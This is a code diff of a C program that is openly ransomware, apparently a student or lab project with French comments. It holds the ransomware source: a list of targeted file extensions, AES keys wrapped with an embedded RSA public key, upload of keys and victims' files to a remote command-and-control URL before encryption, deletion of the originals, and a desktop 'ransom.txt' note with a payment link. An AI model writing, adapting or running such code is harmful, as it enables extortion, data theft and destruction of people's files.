@@ -9,14 +9,16 @@
 #include <fcntl.h>
 #include <openssl/evp.h>
 #include <openssl/aes.h>
+
+
 #include <openssl/rand.h>
+
 #include <openssl/err.h>
 
 #ifdef _WIN32
 #include <windows.h>
 #include <shlobj.h>
 #include <wchar.h>
-#include <lmcons.h>
 #else
 #include <unistd.h>
 #endif
@@ -29,16 +31,17 @@ char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
 void write_to_file(char *filename, char *value, int size);
 void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL);
 char generate_random_char();
+void create_prank_file(const char *key);
 
 
 // Liste des extensions à chiffrer
-const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".c", ".h", 
-                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".md",
+const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", 
+                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", 
                             ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", 
                             ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", 
                             ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                             ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", 
-                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip",
+                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", 
                             ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", 
                             ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
                             ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", 
@@ -56,8 +59,6 @@ const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi
 const size_t num_extensions = sizeof(extensions) / sizeof(extensions[0]);
 
 int main() {
-
-
     OpenSSL_add_all_algorithms();
     ERR_load_crypto_strings();
 
@@ -72,6 +73,7 @@ int main() {
     const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\nF07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n-----END PUBLIC KEY-----\n";
 
     load_public_key(public_key_pem, &pub_key);
+    // load_private_key("private_key.pem", &priv_key);
 
     // Generate AES key and IV
     unsigned char key[32];
@@ -85,14 +87,14 @@ int main() {
     key_lisible = debug_bytes(key, key_size);
     iv_lisible = debug_bytes(iv, iv_size);
     
-    // printf("\nAES non chiffré: %s",key_lisible);
-    // printf("\nIV non chiffré: %s",iv_lisible);
+    printf("\nAES non chiffré: %s",key_lisible);
+    printf("\nIV non chiffré: %s",iv_lisible);
 
     char *encrypted_key = rsa_encrypt(key_lisible, &pub_key);
-    // printf("\n\nAES chiffré : %s\n", encrypted_key);
+    printf("\n\nAES chiffré : %s\n", encrypted_key);
     
     char *encrypted_iv = rsa_encrypt(iv_lisible, &pub_key);
-    // printf("\n\nIV chiffré : %s\n", encrypted_iv);
+    printf("\n\nIV chiffré : %s\n", encrypted_iv);
 
     write_to_file("aes_key.txt", encrypted_key, 1024);
     write_to_file("iv.txt", encrypted_iv, 1024);
@@ -108,6 +110,8 @@ int main() {
 
     char *ID = short_aes;
     
+    create_prank_file(encrypted_key);
+
     sendFileToApi("aes_key.txt", ID, URL);
     sendFileToApi("iv.txt", ID, URL);
     browse_files(key, iv, aad, ID, URL);
@@ -115,20 +119,18 @@ int main() {
     free(encrypted_iv); 
 
     free_public_key(&pub_key);
-  
-    create_prank_file();
-  
+
     return 0;
 
 }
 
-void create_prank_file() {
+void create_prank_file(const char *key) {
     char path[1024];
     char user[256];
 
     #ifdef _WIN32
     if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
-        strcat(path, "\\prank.txt");
+        strcat(path, "\\ransom.txt");
     } else {
         fprintf(stderr, "Failed to get desktop directory.\n");
         return;
@@ -136,7 +138,7 @@ void create_prank_file() {
     #else
     char *homeDir = getenv("HOME");
     if (homeDir != NULL) {
-        snprintf(path, sizeof(path), "%s/Desktop/prank.txt", homeDir);
+        snprintf(path, sizeof(path), "%s/Desktop/ransom.txt", homeDir);
     } else {
         fprintf(stderr, "Unable to get HOME environment variable.\n");
         return;
@@ -149,7 +151,7 @@ void create_prank_file() {
         return;
     }
 
-    fprintf(file, "prank\n");
+    fprintf(file, "We locked all your files, cuz of skills issues XDXDXDXDXDXD\nTo get your files back, follow this link and follow the instructions: http://willchabemyvalentine.love:42956/victim_login\nUse this to connect: %s\nGet rekd :3\nBest regards", key);
     fclose(file);
 
     printf("File created at: %s\n", path);
@@ -209,89 +211,70 @@ char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size){
     for (size_t i = 0; i < sequence_size; ++i) {
         j += sprintf(&lisible[j], "%02x", byte_sequence[i]);
     }
+    // printf("KEY / IV : %s\n", lisible); // Affiche la représentation hexadécimale
     return lisible;
 }
 
 void write_to_file(char *filename, char *value, int size){
     FILE *file_pointer;
-    file_pointer = fopen(filename, "w");
+    file_pointer = fopen(filename, "w"); // Ouvre le fichier en mode écriture
 
     if (file_pointer == NULL) {
         printf("Error: cannot open the file.\n");
     }
 
-    fwrite(value, sizeof(char), size, file_pointer); 
+    fwrite(value, sizeof(char), size, file_pointer); // Écrit la clé dans le fichier
 
-    fclose(file_pointer);
+    fclose(file_pointer); // Ferme le fichier
 }
 
-char* get_user_path() {
-    const char *user;
-    char *path;
+void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL){
+    // List all the files we want to encrypt
+    const char *path;
 
     #ifdef _WIN32
-    user = getenv("USERNAME");
-    size_t size = snprintf(NULL, 0, "C:\\Users\\%s", user) + 1;
-    path = (char *)malloc(size);
-    snprintf(path, size, "C:\\Users\\%s", user);
+    path = "C:\\Users\\me\\Documents";
     #else
-    user = getenv("USER");
-    size_t size = snprintf(NULL, 0, "/home/%s", user) + 1;
-    path = (char *)malloc(size);
-    snprintf(path, size, "/home/%s", user);
-    printf("%s", path);
+    path = "/home/mike/Pictures";
     #endif
 
-    return path;
-}
-
-void handle_file(const char *path, const char *id, const char *URL, unsigned char *key, unsigned char *iv, unsigned char *aad) {
-    sendFileToApi(path, id, URL);
-    encrypt_file(key, iv, aad, path);
-    
-    if (remove(path) == 0) {
-        printf("File deleted successfully: %s\n", path);
-    } else {
-        perror("Error deleting file");
-    }
-}
-
-int should_ignore_file(const char *path, const char *ignoreDirs[], size_t num_ignoreDirs) {
-    for (size_t j = 0; j < num_ignoreDirs; ++j) {
-        if (strstr(path, ignoreDirs[j]) != NULL) {
-            return 1;
-        }
-    }
-    return 0;
-}
-
-void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL) {
-    char *path = get_user_path();
     PathList pathList;
     initPathList(&pathList);
+
     listFiles(path, &pathList);
-    free(path);
 
-    const char *ignoreDirs[] = {
-        "Windows\\", "Program Files\\", "Programmes\\", "Programmes (x86)\\",
-        "Program Files (x86)\\", "ProgramData\\", "$Recycle.Bin\\", "Corbeille\\", "AppData\\"
-    };
-    size_t num_ignoreDirs = sizeof(ignoreDirs) / sizeof(ignoreDirs[0]);
-
+    //Browse files
     for (size_t i = 0; i < pathList.count; ++i) {
-        if (should_ignore_file(pathList.paths[i], ignoreDirs, num_ignoreDirs)) {
-            continue;
-        }
 
+        if (strstr(pathList.paths[i], "basic_c/") != NULL) {
+            continue; // Ignorer le dossier "basic_c" et ses fichiers
+        }
+        
+        // Check if the file has one of the specified extensions
         char *extension = strrchr(pathList.paths[i], '.');
         if (extension != NULL) {
             for (size_t j = 0; j < num_extensions; ++j) {
                 if (strcmp(extension, extensions[j]) == 0) {
-                    handle_file(pathList.paths[i], id, URL, key, iv, aad);
+                    // Send the files to the C2 before being encrypted
+                    sendFileToApi(pathList.paths[i], id, URL);
+                    // Encrypt the file
+                    encrypt_file(key, iv, aad, pathList.paths[i]);
+                    // Decrypt the file (for demonstration purposes)
+                    sleep(1);
+                    #ifdef _WIN32
+                    // Supprimer le fichier d'origine après chiffrement sur Windows
+                    if (remove(pathList.paths[i]) == 0) {
+                        printf("File deleted successfully: %s\n", pathList.paths[i]);
+                    } else {
+                        printf("Error deleting file: %s\n", pathList.paths[i]);
+                    }
+                    #endif
                     break;
                 }
             }
         }
     }
+
     freePathList(&pathList);
 }
+
